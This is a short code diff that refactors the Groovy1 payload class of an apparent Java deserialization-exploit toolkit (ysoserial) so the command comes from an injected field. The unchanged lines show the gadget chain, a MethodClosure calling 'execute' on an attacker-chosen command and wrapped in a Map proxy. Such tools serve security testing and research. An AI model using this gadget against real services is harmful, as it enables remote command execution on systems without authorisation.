@@ -6,6 +6,8 @@ import java.util.Map;
 import org.codehaus.groovy.runtime.ConvertedClosure;
 import org.codehaus.groovy.runtime.MethodClosure;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -28,8 +30,17 @@ import ysoserial.payloads.util.PayloadRunner;
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
+	
+	@Bind private String command;
 
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public InvocationHandler getObject(final String command) throws Exception {
+		return getObject();
+	}
+
+	public InvocationHandler getObject() throws Exception {
 		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
 		
 		final Map map = Gadgets.createProxy(closure, Map.class);		
